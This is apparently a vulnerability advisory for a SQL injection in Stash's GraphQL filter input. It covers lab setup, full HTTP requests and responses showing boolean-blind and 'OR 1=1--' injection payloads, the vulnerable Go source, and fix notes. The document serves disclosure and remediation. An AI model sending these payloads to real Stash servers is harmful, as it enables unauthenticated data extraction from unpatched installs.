### Vulnerability details

**Official website / Product:** https://stashapp.cc / https://docs.stashapp.cc

**Repository:** stashapp/stash (stars at selection: 13337)

**Vulnerability type:** SQLi

**Vulnerability versions:** v0.31.1 (Docker `stashapp/stash:latest`, commit `4de2351e`, image digest `sha256:51b0703b2f20d88af7881ef5c182b0f26a0f87f599e911d533c13971f66c6875`); same sink present on develop tip at audit time (`9e9ad972`)

**Vulnerability URL / Parameter:** `POST /graphql` → `HierarchicalMultiCriterionInput.value` on queries such as `findPerformers` / `findScenes` (`performer_filter.tags.value`, `scene_filter.tags.value`, etc.), concatenated unquoted into SQL `VALUES(...)` by `getHierarchicalValues`

**Complex:** yes

### Verification procedure

1. Start the lab (original `labs/stash-r34-a8/` was torn down; rebuild the same topology). Image `stashapp/stash:latest` (v0.31.1 / `4de2351e`), host port **21408→9999**, container name `stash-r34-a8`. Save the YAML below as `docker-compose.yml`, then run `docker compose up -d`. Proxy for image pulls: `http://127.0.0.1:7890`; call GraphQL on localhost without proxy. Wait until `http://127.0.0.1:21408` is reachable. Ready-state example: `stash-r34-a8` image `stashapp/stash:latest`, `0.0.0.0:21408->9999/tcp`.

```yaml
services:
  stash:
    image: stashapp/stash:latest
    container_name: stash-r34-a8
    ports:
      - "21408:9999"
    environment:
      - STASH_STASH=/data/
      - STASH_GENERATED=/generated/
      - STASH_METADATA=/metadata/
      - STASH_CACHE=/cache/
      - STASH_PORT=9999
      - TZ=Etc/UTC
    volumes:
      - stash-r34-a8-config:/root/.stash
      - stash-r34-a8-data:/data
      - stash-r34-a8-metadata:/metadata
      - stash-r34-a8-cache:/cache
      - stash-r34-a8-blobs:/blobs
      - stash-r34-a8-generated:/generated

volumes:
  stash-r34-a8-config:
  stash-r34-a8-data:
  stash-r34-a8-metadata:
  stash-r34-a8-cache:
  stash-r34-a8-blobs:
  stash-r34-a8-generated:
```

```bash
docker compose up -d
```

2. First boot requires GraphQL `setup` (omit `initialUsername`/`initialPassword` → **no credentials**; stash path `/data`):

```http
POST /graphql HTTP/1.1
Host: 127.0.0.1:21408
Accept: application/json
Content-Type: application/json
Connection: close

{"query":"mutation($i:SetupInput!){ setup(input:$i) }","variables":{"i":{"configLocation":"","stashes":[{"path":"/data","excludeVideo":false,"excludeImage":false}],"databaseFile":"","generatedLocation":"","cacheLocation":"","storeBlobsInDatabase":true,"blobsLocation":""}}}
```

3. Seed tags and a performer (matches verification seed: `ParentTag` id=1, `ChildTag`, `OtherTag`; performer `TestPerf` tagged with `ParentTag`):

```http
POST /graphql HTTP/1.1
Host: 127.0.0.1:21408
Accept: application/json
Content-Type: application/json
Connection: close

{"query":"mutation { a: tagCreate(input:{name:\"ParentTag\"}){id name} b: tagCreate(input:{name:\"ChildTag\", parent_ids:[\"1\"]}){id name} c: tagCreate(input:{name:\"OtherTag\"}){id name} p: performerCreate(input:{name:\"TestPerf\", tag_ids:[\"1\"]}){id name tags{id name}} }"}
```

4. Boolean-true inject: `tags.value = ["(SELECT id FROM tags WHERE name='ParentTag')"]`, `modifier=INCLUDES`, `depth=0` → `count=1` (PoC A below).
5. Boolean-false inject: `tags.value = ["(SELECT id FROM tags WHERE name='NOEXIST')"]` → `count=0` (PoC B below).
6. Optional syntax-error proof: `findScenes` + `value=["1) OR 1=1--"]` echoes `VALUES(1) OR 1=1--` in the error (PoC C below).

### Complete vulnerability PoC

#### PoC A — boolean true (subquery returns ParentTag id)

Complete HTTP request (Docker-verified):

```http
POST /graphql HTTP/1.1
Host: 127.0.0.1:21408
User-Agent: stash-audit-r34-a8/1.0
Accept: application/json
Content-Type: application/json
Content-Length: 263
Connection: close

{"query":"query($f:PerformerFilterType){ findPerformers(performer_filter:$f, filter:{per_page:10}){ count performers{id name tags{id name}} } }","variables":{"f":{"tags":{"value":["(SELECT id FROM tags WHERE name='ParentTag')"],"modifier":"INCLUDES","depth":0}}}}
```

Complete HTTP response (Docker-verified):

```http
HTTP/1.1 200 OK
Cache-Control: no-store
Content-Type: application/json
Vary: Origin
X-Content-Type-Options: nosniff
Date: Mon, 02 Nov 2026 01:56:26 GMT
Content-Length: 122
Connection: close

{"data":{"findPerformers":{"count":1,"performers":[{"id":"1","name":"TestPerf","tags":[{"id":"1","name":"ParentTag"}]}]}}}
```

#### PoC B — boolean false (subquery returns no row / NULL)

Complete HTTP request (Docker-verified):

```http
POST /graphql HTTP/1.1
Host: 127.0.0.1:21408
User-Agent: stash-audit-r34-a8/1.0
Accept: application/json
Content-Type: application/json
Content-Length: 261
Connection: close

{"query":"query($f:PerformerFilterType){ findPerformers(performer_filter:$f, filter:{per_page:10}){ count performers{id name tags{id name}} } }","variables":{"f":{"tags":{"value":["(SELECT id FROM tags WHERE name='NOEXIST')"],"modifier":"INCLUDES","depth":0}}}}
```

Complete HTTP response (Docker-verified):

```http
HTTP/1.1 200 OK
Cache-Control: no-store
Content-Type: application/json
Vary: Origin
X-Content-Type-Options: nosniff
Date: Mon, 02 Nov 2026 01:55:41 GMT
Content-Length: 55
Connection: close

{"data":{"findPerformers":{"count":0,"performers":[]}}}
```

#### PoC C — syntax error (proves raw interpolation into `VALUES(...)`)

Complete HTTP request (Docker-verified; uses `findScenes` → `scenes_tags` JOIN):

```http
POST /graphql HTTP/1.1
Host: 127.0.0.1:21408
User-Agent: stash-audit-r34-a8/1.0
Accept: application/json
Content-Type: application/json
Content-Length: 183
Connection: close

{"query":"query($f:SceneFilterType){ findScenes(scene_filter:$f, filter:{per_page:5}){ count } }","variables":{"f":{"tags":{"value":["1) OR 1=1--"],"modifier":"INCLUDES","depth":0}}}}
```

Complete HTTP response (Docker-verified):

```http
HTTP/1.1 200 OK
Cache-Control: no-store
Content-Type: application/json
Vary: Origin
X-Content-Type-Options: nosniff
Date: Mon, 02 Nov 2026 01:55:41 GMT
Content-Length: 888
Connection: close

{"errors":[{"message":"error querying aggregate fields: executing query: SELECT COUNT(DISTINCT temp.id) as total FROM (SELECT DISTINCT scenes.id FROM scenes LEFT JOIN (\n\t\tSELECT j.*, d.column1 AS root_id, d.column2 AS item_id FROM scenes_tags AS j\n\t\tINNER JOIN (VALUES(1) OR 1=1--, 1) OR 1=1--)) AS d ON j.tag_id = d.column2\n\t)\n\t AS scene_tag ON scene_tag.scene_id = scenes.id WHERE (scene_tag.root_id IS NOT NULL)) as temp [[]]: error executing `SELECT COUNT(DISTINCT temp.id) as total FROM (SELECT DISTINCT scenes.id FROM scenes LEFT JOIN (\n\t\tSELECT j.*, d.column1 AS root_id, d.column2 AS item_id FROM scenes_tags AS j\n\t\tINNER JOIN (VALUES(1) OR 1=1--, 1) OR 1=1--)) AS d ON j.tag_id = d.column2\n\t)\n\t AS scene_tag ON scene_tag.scene_id = scenes.id WHERE (scene_tag.root_id IS NOT NULL)) as temp` [[]]: near \"OR\": syntax error","path":["findScenes"]}],"data":null}
```

Verification result notes:

- PoC A returns `count=1` with `TestPerf`/`ParentTag`; PoC B returns `count=0`. Differing counts prove the server evaluates attacker strings as SQL expressions (boolean blind).
- PoC C error text contains `INNER JOIN (VALUES(1) OR 1=1--, 1) OR 1=1--)`, confirming unquoted concatenation into `VALUES(...)`.
- On default installs without credentials, these GraphQL calls require no authentication.

### Vulnerability analysis

`HierarchicalMultiCriterionInput.value` is `[ID!]` (GraphQL ID scalar; arbitrary strings accepted). In `getHierarchicalValues`, when `depth==0` and every element parses with `Atoi`, IDs are safely formatted with `%d`. If any element is non-integer (or `depth!=0`), a parameterized recursive `id IN (?)` lookup runs first. When that returns no rows (`sql.NullString` invalid), the fallback builds `VALUES(...)` with `fmt.Sprintf("(%s, %s)", value, value)` — **no quotes, no bind parameters** — and embeds it via `joinedHierarchicalMultiCriterionHandlerBuilder` as `INNER JOIN ({valuesClause})`. Attackers inject arbitrary SQL expressions (subqueries, boolean conditions) for boolean-blind data extraction.

Trigger / sink source (full path and line numbers):

```go
# File: pkg/sqlite/criterion_handlers.go
# Lines: 678-772 (sink 764-769); JOIN embed call site 936-954
func getHierarchicalValues(ctx context.Context, values []string, table, relationsTable, parentFK string, childFK string, depth *int) (string, error) {
	var args []interface{}
	// ... parentFK/childFK defaults, depthVal ...
	if depthVal == 0 {
		valid := true
		var valuesClauses []string
		for _, value := range values {
			id, err := strconv.Atoi(value)
			if err != nil {
				valid = false
				break
			}
			valuesClauses = append(valuesClauses, fmt.Sprintf("(%d,%d)", id, id))
		}
		if valid {
			return "VALUES" + strings.Join(valuesClauses, ","), nil
		}
	}
	// parameterized WITH RECURSIVE lookup; query binds args...
	var valuesClause sql.NullString
	err := dbWrapper.Get(ctx, &valuesClause, query, args...)
	// if no values are found, just return a values string with the values only
	if !valuesClause.Valid {
		for i, value := range values {
			values[i] = fmt.Sprintf("(%s, %s)", value, value) // sink: unquoted concat
		}
		valuesClause.String = "VALUES" + strings.Join(values, ",")
	}
	return valuesClause.String, nil
}

# joinedHierarchicalMultiCriterionHandlerBuilder.handler (same file 942-950):
joinTable := utils.StrFormat(`(
		SELECT j.*, d.column1 AS root_id, d.column2 AS item_id FROM {joinTable} AS j
		INNER JOIN ({valuesClause}) AS d ON j.{foreignFK} = d.column2
	)
	`, ...)
```

### Fix notes

1. Do not concatenate raw strings in the empty-result fallback: reject non-integer IDs, or rely only on the parameterized recursive query result.
2. If `VALUES` must be built, accept only `Atoi`-validated integers and format with `%d`.
3. Enforce decimal-integer validation on GraphQL `ID` values before SQL construction.
4. Add regression tests for non-numeric hierarchical `value` inputs asserting they never enter the string-concat `VALUES` path.
